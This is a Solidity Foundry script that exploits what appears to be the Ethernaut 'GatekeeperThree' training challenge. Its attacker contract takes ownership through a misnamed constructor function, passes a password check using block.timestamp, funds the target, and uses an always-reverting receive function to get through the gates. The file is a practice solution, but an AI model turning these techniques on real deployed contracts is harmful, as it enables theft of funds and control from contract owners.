// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/28-GatekeeperThree.sol";

contract Exploit {
    GatekeeperThree public GatekeeperThreeInstance;

    constructor(address _gatekeeper_three) {
        GatekeeperThreeInstance = GatekeeperThree(payable(_gatekeeper_three));
        (bool success, ) = _gatekeeper_three.call(abi.encodeWithSignature("createTrick()"));
        require(success, "createTrick failed");
    }

    function getAllowance() external {
        (bool success, ) = address(GatekeeperThreeInstance).call(abi.encodeWithSignature("getAllowance(uint256)", uint256(block.timestamp)));
        require(success, "getAllowance failed");
    }

    function construct0r() external {
        (bool success, ) = address(GatekeeperThreeInstance).call(abi.encodeWithSignature("construct0r()"));
        require(success, "construct0r failed");
    }

    function enter() external {
        (bool success, ) = address(GatekeeperThreeInstance).call(abi.encodeWithSignature("enter()"));
        require(success, "enter failed");
    }

    receive() external payable {
        revert();
    }
}

contract Exp is Script {
    GatekeeperThree public GatekeeperThreeInstance = GatekeeperThree(payable(0xC7d43DA105BB8DC4E2Dc15324Dcf46B50Da52b16));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");

    function run() external {
        vm.startBroadcast(hacker);

        Exploit exploit = new Exploit(address(GatekeeperThreeInstance));

        exploit.getAllowance();

        (bool success, ) = address(GatekeeperThreeInstance).call{value: 0.001 ether + 1}("");
        require(success, "Ether transfer failed");
        console.log("GatekeeperThree balance: ", address(GatekeeperThreeInstance).balance);

        exploit.construct0r();
        exploit.enter();

        vm.stopBroadcast();
    }
}
